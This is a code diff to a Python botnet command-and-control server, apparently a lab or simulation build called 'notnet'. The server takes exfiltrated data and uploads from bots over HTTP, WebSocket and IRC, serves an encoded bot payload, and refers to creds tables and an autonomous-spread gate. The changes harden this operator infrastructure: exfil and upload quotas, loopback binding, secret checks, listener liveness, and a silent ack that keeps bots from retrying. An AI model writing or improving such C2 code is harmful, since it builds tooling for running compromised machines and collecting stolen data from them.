@@ -49,13 +49,21 @@ DEFAULT_WS = 8081
 DEFAULT_IRC = 6667
 DEFAULT_CONSOLE = 8090
 
-# Request-size caps (#165/#166/#183): a bot request is small JSON or a
-# PAYLOAD_MAX_SIZE (64KB) upload; anything larger is an attack or a bug.
+# Request-size caps (#165/#166/#183): a bot request is small JSON or an
+# octet-stream upload; anything larger is an attack or a bug.
 MAX_HTTP_REQUEST = 2 * 1024 * 1024        # total buffered bytes per request
 MAX_UPLOAD_BODY = 8 * 1024 * 1024         # upload body cap (128x payload max)
 MAX_WS_FRAME = 1024 * 1024                # WS frame payload cap
 MAX_WS_HANDSHAKE = 16 * 1024              # #209: handshake/header bytes cap
 UPLOAD_NAME_RE = re.compile(r"^[A-Za-z0-9._-]{1,128}$")
+
+# Aggregate storage quotas (#220/#273): per-request caps alone let a single
+# secret-holder fill the disk one legal-sized POST at a time.
+MAX_UPLOADS_DIR_BYTES = 256 * 1024 * 1024   # total bytes across uploads/
+MAX_EXFIL_ROWS = 50_000                     # row cap on the exfil table
+MAX_EXFIL_TABLE_BYTES = 64 * 1024 * 1024    # total chunk bytes in exfil
+
+DEFAULT_BIND = "127.0.0.1"                  # #217: data listeners bind loopback unless told otherwise
 
 _lock = threading.Lock()
 
@@ -293,11 +301,23 @@ class State:
             self.db.commit()
 
     def add_exfil(self, chunk, ip):
+        """Insert one exfil chunk under the aggregate table quota.
+
+        #220/#273: per-request caps alone let a single secret-holder fill
+        the disk one legal-sized POST at a time. Enforce a row-count and
+        total-bytes bound on write; over quota returns False so the caller
+        rejects (no row is written)."""
         with self._lk:
+            rows, used = self.db.execute(
+                "SELECT COUNT(*), COALESCE(SUM(LENGTH(chunk)),0) FROM exfil"
+            ).fetchone()
+            if rows + 1 > MAX_EXFIL_ROWS or used + min(len(chunk), 65536) > MAX_EXFIL_TABLE_BYTES:
+                return False
             self.db.execute(
                 "INSERT INTO exfil(chunk,source_ip,received_at) VALUES(?,?,?)",
                 (chunk[:65536], ip, time.time()))
             self.db.commit()
+            return True
 
     def add_event(self, kind, detail):
         with self._lk:
@@ -350,23 +370,30 @@ class State:
 # A one-request-per-connection server (Connection: close) makes the bot's
 # connected flag drop and the autonomous-spread gate open (#95).
 
-def recv_http(conn):
+def recv_http(conn, default_cap=MAX_HTTP_REQUEST, upload_cap=MAX_UPLOAD_BODY):
     """Read one HTTP request from conn.
 
     Returns (method, path, body, headers) or None on close. `headers` is a
     lower-cased dict of the request headers (used for Content-Type routing
     of uploads, #134).
 
-    #165: total buffered bytes are capped at MAX_HTTP_REQUEST and an
-    oversized declared Content-Length is rejected up front, so a client
-    cannot grow the buffer without bound (slowloris with huge headers or
-    a giant body)."""
+    #165: total buffered bytes are capped and an oversized declared
+    Content-Length is rejected up front, so a client cannot grow the buffer
+    without bound (slowloris with huge headers or a giant body).
+
+    #219: upload requests (octet-stream POST to the heartbeat path, or any
+    /upload route) are capped at the documented MAX_UPLOAD_BODY instead of
+    the generic 2MB request cap — before this, MAX_UPLOAD_BODY was dead
+    code because recv_http dropped 8MB uploads first. Non-upload requests
+    keep the tighter default_cap; until headers are parsed, default_cap
+    bounds header growth."""
     conn.settimeout(30)
     buf = b""
+    cap = default_cap
     try:
         while True:
-            if len(buf) > MAX_HTTP_REQUEST:
-                log(f"HTTP request exceeds {MAX_HTTP_REQUEST} bytes — dropped")
+            if len(buf) > cap:
+                log(f"HTTP request exceeds {cap} bytes — dropped")
                 return None
             chunk = conn.recv(8192)
             if not chunk:
@@ -399,8 +426,23 @@ def recv_http(conn):
                             clen = int(v.strip())
                         except ValueError:
                             clen = 0
-                if clen > MAX_HTTP_REQUEST:
+                if clen > MAX_HTTP_REQUEST and clen > upload_cap:
                     log(f"HTTP Content-Length {clen} exceeds cap — dropped")
+                    return None
+                # #219: once the request line + Content-Type are known we can
+                # tell uploads from ordinary requests; uploads get the
+                # documented MAX_UPLOAD_BODY, everything else default_cap.
+                req_path = path.split("?", 1)[0].rstrip("/")
+                ctype = (headers.get("content-type") or "").lower()
+                is_upload = ("octet-stream" in ctype
+                             or req_path.endswith("/upload")
+                             or "/upload/" in req_path)
+                cap = upload_cap if is_upload else default_cap
+                if clen > cap:
+                    log(f"HTTP Content-Length {clen} exceeds cap {cap} — dropped")
+                    return None
+                if len(rest) > cap:
+                    log(f"HTTP body exceeds {cap} bytes — dropped")
                     return None
                 if len(rest) < clen:
                     break  # need more body bytes
@@ -447,6 +489,23 @@ def http_send_file(conn, path, ctype):
         pass
 
 
+def _uploads_dir_bytes(up_dir):
+    """Total bytes of files currently stored in uploads/ (#220 quota)."""
+    total = 0
+    try:
+        names = os.listdir(up_dir)
+    except OSError:
+        return 0
+    for fn in names:
+        try:
+            fp = os.path.join(up_dir, fn)
+            if os.path.isfile(fp):
+                total += os.path.getsize(fp)
+        except OSError:
+            continue
+    return total
+
+
 def _ingest_upload(c2, body, ip, path, secret_ok=False):
     """Persist an uploaded file from the bot (#134).
 
@@ -475,6 +534,16 @@ def _ingest_upload(c2, body, ip, path, secret_ok=False):
         os.makedirs(up_dir, exist_ok=True)
     except OSError:
         pass
+    # #220: aggregate quota — total bytes already stored in uploads/ plus
+    # this body must stay under MAX_UPLOADS_DIR_BYTES, else reject. Without
+    # this a single secret-holder fills the disk one legal-sized POST at
+    # a time.
+    if _uploads_dir_bytes(up_dir) + len(body) > MAX_UPLOADS_DIR_BYTES:
+        c2.state.add_event("upload_reject",
+                           f"upload from {ip} rejected: uploads dir over "
+                           f"{MAX_UPLOADS_DIR_BYTES} byte quota")
+        log(f"UPLOAD REJECT {ip} {len(body)} bytes (uploads dir over quota)")
+        return None
     ts = int(time.time() * 1000)
     # basename of an explicit /upload/<name> if present, else ip timestamp
     name = os.path.basename(path.rstrip("/")) if path.endswith("/upload") or "/upload/" in path \
@@ -660,7 +729,16 @@ def handle_http(conn, addr, c2):
                     # #331/#207: unauthenticated caller — no secret echo.
                     http_send(conn, json.dumps({"status": "ok"}))
                     continue
-                c2.state.add_exfil(text, ip)
+                if not c2.state.add_exfil(text, ip):
+                    # #220/#273: aggregate table quota — reject instead of
+                    # letting the exfil table grow until the disk fills.
+                    # Bare ack (no secret echo) so the bot sees no failure
+                    # signal it would retry against.
+                    c2.state.add_event("exfil_reject",
+                                       f"exfil from {ip} rejected: table over quota")
+                    log(f"EXFIL REJECT {ip} len={len(text)} (quota)")
+                    http_send(conn, json.dumps({"status": "ok"}))
+                    continue
                 log(f"EXFIL {ip} len={len(text)}")
                 http_send(conn, json.dumps({"status": "ok", "secret": c2.secret}))
                 continue
@@ -741,12 +819,27 @@ def handle_http(conn, addr, c2):
             pass
 
 
-def serve_http(c2, port):
+def _bind_listener(kind, port, bind):
+    """Create + bind + listen a data-listener socket.
+
+    #217: binds `bind` (default loopback) — never an unconditional
+    0.0.0.0. #218: a bind failure is logged loudly here and the OSError
+    propagates so the listener thread dies; main() watches thread
+    liveness and exits non-zero instead of half-serving."""
     srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    srv.bind(("0.0.0.0", port))
+    try:
+        srv.bind((bind, port))
+    except OSError as e:
+        log(f"FATAL {kind} LISTENER BIND FAILED on {bind}:{port}: {e} (#218)")
+        raise
     srv.listen(64)
-    log(f"LISTEN HTTP C2 on 0.0.0.0:{port} path={c2.http_path}"
+    return srv
+
+
+def serve_http(c2, port, bind=DEFAULT_BIND):
+    srv = _bind_listener("HTTP C2", port, bind)
+    log(f"LISTEN HTTP C2 on {bind}:{port} path={c2.http_path}"
         + (" TLS" if c2.tls_ctx else ""))
     while True:
         try:
@@ -930,12 +1023,9 @@ def handle_ws(conn, addr, c2):
             pass
 
 
-def serve_ws(c2, port):
-    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    srv.bind(("0.0.0.0", port))
-    srv.listen(32)
-    log(f"LISTEN WS C2 on 0.0.0.0:{port}")
+def serve_ws(c2, port, bind=DEFAULT_BIND):
+    srv = _bind_listener("WS C2", port, bind)
+    log(f"LISTEN WS C2 on {bind}:{port}")
     while True:
         try:
             conn, addr = srv.accept()
@@ -1091,12 +1181,9 @@ def handle_irc(conn, addr, c2, nick, channel):
             pass
 
 
-def serve_irc(c2, port, nick, channel):
-    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    srv.bind(("0.0.0.0", port))
-    srv.listen(16)
-    log(f"LISTEN IRC C2 on 0.0.0.0:{port} nick={nick} channel={channel}")
+def serve_irc(c2, port, nick, channel, bind=DEFAULT_BIND):
+    srv = _bind_listener("IRC C2", port, bind)
+    log(f"LISTEN IRC C2 on {bind}:{port} nick={nick} channel={channel}")
     while True:
         try:
             conn, addr = srv.accept()
@@ -1486,6 +1573,10 @@ def main():
     ap.add_argument("--irc-port", type=int, default=int(os.environ.get("SIM_IRC_PORT", DEFAULT_IRC)))
     ap.add_argument("--irc-nick", default=os.environ.get("SIM_IRC_NICK", "mockirc"))
     ap.add_argument("--irc-channel", default=os.environ.get("SIM_IRC_CHANNEL", "#notnet"))
+    ap.add_argument("--bind-address", default=os.environ.get("NOTNET_C2_BIND", DEFAULT_BIND),
+                    help="Bind address for the data listeners (HTTP C2, payload, "
+                         "WS, IRC). Default 127.0.0.1 (#217); use 0.0.0.0 ONLY "
+                         "deliberately — with the default secret it is refused (#172).")
     ap.add_argument("--console-token",
                     default=os.environ.get("NOTNET_C2_CONSOLE_TOKEN", ""),
                     help="Bearer token for the operator console API + dashboard. "
@@ -1508,14 +1599,15 @@ def main():
             f"{args.console_bind} (set --console-token or use 127.0.0.1). #136")
         sys.exit(2)
 
-    # #172: the compile-time default secret must never guard a fleet that
-    # listens on 0.0.0.0. Loopback-only lab runs may keep it.
+    # #172 (as amended by #217): the compile-time default secret must never
+    # guard a fleet that listens on a non-loopback interface. The check is
+    # based on the actual bind address now — not the port number, which
+    # said nothing about exposure. Loopback-only lab runs may keep it.
     if args.secret == DEFAULT_SECRET:
-        exposed = any(p != 0 for p in (args.http_port, args.payload_port,
-                                       args.ws_port, args.irc_port))
-        if exposed:
-            log("REFUSING to start with the default secret on exposed "
-                "listeners — set --secret or NOTNET_C2_SECRET. #172")
+        if args.bind_address not in ("127.0.0.1", "localhost", "::1"):
+            log(f"REFUSING to start with the default secret bound to "
+                f"{args.bind_address} — set --secret or NOTNET_C2_SECRET "
+                f"(or bind loopback). #172/#217")
             sys.exit(2)
         log("WARNING: default secret in use (loopback lab only). #172")
 
@@ -1544,15 +1636,19 @@ def main():
             log(f"PAYLOAD-XOR: no {src} — /bot/notnet.enc will MISS")
 
     threads = [
-        threading.Thread(target=serve_http, args=(c2, args.http_port), daemon=True),
-        threading.Thread(target=serve_http, args=(c2, args.payload_port), daemon=True),
+        threading.Thread(target=serve_http, args=(c2, args.http_port, args.bind_address),
+                         name="serve-http", daemon=True),
+        threading.Thread(target=serve_http, args=(c2, args.payload_port, args.bind_address),
+                         name="serve-payload", daemon=True),
         threading.Thread(target=serve_console,
                          args=(c2, args.console_port, args.console_bind),
-                         daemon=True),
-        threading.Thread(target=serve_ws, args=(c2, args.ws_port), daemon=True),
+                         name="serve-console", daemon=True),
+        threading.Thread(target=serve_ws, args=(c2, args.ws_port, args.bind_address),
+                         name="serve-ws", daemon=True),
         threading.Thread(target=serve_irc,
-                         args=(c2, args.irc_port, args.irc_nick, args.irc_channel),
-                         daemon=True),
+                         args=(c2, args.irc_port, args.irc_nick, args.irc_channel,
+                               args.bind_address),
+                         name="serve-irc", daemon=True),
     ]
     for t in threads:
         t.start()
@@ -1564,10 +1660,21 @@ def main():
     signal.signal(signal.SIGTERM, _stop)
     signal.signal(signal.SIGINT, _stop)
     # #215: opportunistic retention sweep — prune append-only tables
-    # (creds/exfil/events/commands) to RETENTION_MAX_ROWS each cycle.
+    # (creds/exfil/events/commands) to RETENTION_MAX_ROWS, folded into the
+    # liveness-watch loop so both run off one ticker.
+    last_prune = 0.0
+    # #218: a listener thread that dies (bind failure on a port conflict,
+    # unexpected socket error) must take the whole server down — a "healthy"
+    # process with silently missing channels is worse than a crash.
     while True:
-        c2.state.prune()
-        time.sleep(3600)
+        time.sleep(1)
+        if time.time() - last_prune >= 3600:
+            c2.state.prune()
+            last_prune = time.time()
+        dead = [t.name for t in threads if not t.is_alive()]
+        if dead:
+            log(f"FATAL listener(s) exited: {', '.join(dead)} — shutting down (#218)")
+            sys.exit(1)
 
 
 if __name__ == "__main__":
